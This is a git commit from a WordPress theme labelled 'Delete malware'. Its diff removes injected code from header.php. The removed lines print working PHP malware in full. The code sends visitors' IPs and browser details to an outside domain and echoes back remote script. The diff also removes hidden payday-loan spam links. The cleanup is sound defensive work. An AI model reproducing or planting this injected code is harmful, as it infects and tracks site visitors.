3c99613503d82aa568bc0ed6bcbea162f4a452bd
papayalabs <papayalabs@gmail.com>
2015-10-09 10:46:12 -0430

    Delete malware

--- wp/wp-content/themes/hogarsigloxxi/header.php
+++ wp/wp-content/themes/hogarsigloxxi/header.php
@@ -13,33 +13,10 @@
 	<title><?php bloginfo('name'); ?> <?php wp_title(); ?></title>
 
 <?php wp_head(); ?>
-<?php
-#19f955#
-error_reporting(0); ini_set('display_errors',0); $wp_xcjln8653 = @$_SERVER['HTTP_USER_AGENT'];
-if (( preg_match ('/Gecko|MSIE/i', $wp_xcjln8653) && !preg_match ('/bot/i', $wp_xcjln8653))){
-$wp_xcjln098653="http://"."tags"."value".".com/value"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xcjln8653);
-$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xcjln098653);
-curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_8653xcjln = curl_exec ($ch); curl_close($ch);}
-if ( substr($wp_8653xcjln,1,3) === 'scr' ){ echo $wp_8653xcjln; }
-#/19f955#
-?>
-<?php
 
-?>
-<?php
-
-?>
-<?php
-
-?>
-<?php
-
-?>
 </head>
 
 <body>
-
-<div id='hideMe'> <p><i> Cheap Payday Loan <a href="http://www.noteletrackcash4ps.com/" title="Cheap Payday Loan">Cheap Payday Loan</a></div><script type='text/javascript'>if(document.getElementById('hideMe') != null){document.getElementById('hideMe').style.visibility = 'hidden';document.getElementById('hideMe').style.display = 'none';}</script><div id="outline">
 
 
 	<div id="header">
